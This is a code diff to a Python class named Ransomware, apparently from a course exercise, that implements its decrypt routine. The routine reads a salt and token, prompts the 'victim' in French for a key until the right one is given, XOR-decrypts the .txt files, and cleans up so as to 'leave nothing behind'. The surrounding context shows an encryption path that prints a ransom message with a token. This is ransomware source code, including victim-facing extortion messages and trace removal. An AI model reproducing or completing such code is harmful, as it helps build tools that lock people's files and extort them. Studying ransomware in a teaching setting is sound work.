@@ -56,8 +56,45 @@ class Ransomware:
         print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
 
     def decrypt(self):
-        # main function for decrypting (see PDF)
-        raise NotImplemented()
+        # Get the list of encrypted file (.txt files)
+        files_list=self.get_files(".txt")
+
+        # Create SecretManager 
+        secret_manager = SecretManager()
+
+        #Load the salt and token from the files
+        secret_manager.load()
+
+        #Try until the key is right
+        while(True):
+
+            try:
+
+                #Ask the victim for the key 
+                b64_key=input("Saisir la clé :")
+
+                #Verify the key
+                secret_manager.set_key(b64_key)
+
+                #Decrypt files
+                secret_manager.xorfiles(files_list)
+
+                #Leave nothing behind
+                secret_manager.clean()
+
+                #Message to the victim
+                print("Les données ont été restaurées, tout s'est bien passé.")
+                
+                break
+
+            #Manage the excepetion
+            except:
+                print("La clé est incorrecte, saisissez la bonne clé si vous voulez vos données.")
+                continue
+
+        
+
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
